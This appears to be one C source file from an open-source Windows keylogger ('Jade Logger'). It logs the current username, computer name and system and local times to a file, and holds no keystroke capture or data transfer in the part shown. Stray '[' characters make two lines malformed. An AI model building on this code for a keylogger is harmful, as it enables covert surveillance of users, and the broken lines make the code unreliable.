/**
 Jade Logger - An extremely simple Windows keylogger
 Copyright (C) 2013  Adam Thompson <adam@nixgeeks.com>
 
 This program is free software: you can redistribute it and/or modify
 it under the terms of the GNU General Public License as published by
 the Free Software Foundation, either version 3 of the License, or
 (at your option) any later version.
 
 This program is distributed in the hope that it will be useful,
 but WITHOUT ANY WARRANTY; without even the implied warranty of
 MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
 GNU General Public License for more details.
 
 You should have received a copy of the GNU General Public License
 along with this program.  If not, see <http://www.gnu.org/licenses/>.
*/

#include <windows.h>
#include <LMCons.h>

#include "logger.h"
#include "systemLogger.h"

#define _WIN32_WINNT 0x0600

void logSysInfo (FILE *logFile)
{
	logCompInfo(logFile);
	logUserInfo(logFile);
}

void logUserInfo(FILE *logFile)
{
	// Get the username
	LPTSTR lpszSystemInfo;
	DWORD cchBuff = 256;[
	TCHAR tchBuffer[UNLEN + 1];

	lpszSystemInfo = tchBuffer;[
	GetUserName(lpszSystemInfo, &cchBuff);
	
	// Log the info
	jlog(logFile, "# Logged user: %s\n", lpszSystemInfo);
}

void logCompInfo(FILE *logFile)
{
	// Get the computer name, system time, and local time
	LPTSTR lpszSystemInfo;
	DWORD cchBuff = 256;
	TCHAR tchBuffer[UNLEN + 1];
	SYSTEMTIME sysTime, localTime;
	
	lpszSystemInfo = tchBuffer;
	GetComputerName(lpszSystemInfo, &cchBuff);
	GetSystemTime((LPSYSTEMTIME) &sysTime);
	GetLocalTime((LPSYSTEMTIME) &localTime);
	
	// Log the info
	jlog(logFile, "\n# Computer Name: %s\n", lpszSystemInfo);
	jlog(logFile, "# System Time: %02d/%02d/%04d - %02d:%02d\n", sysTime.wDay,
		sysTime.wMonth, sysTime.wYear, sysTime.wHour, sysTime.wMinute);
	jlog(logFile, "# Local Time: %02d/%02d/%04d - %02d:%02d\n", localTime.wDay,
		localTime.wMonth, localTime.wYear, localTime.wHour, localTime.wMinute);
}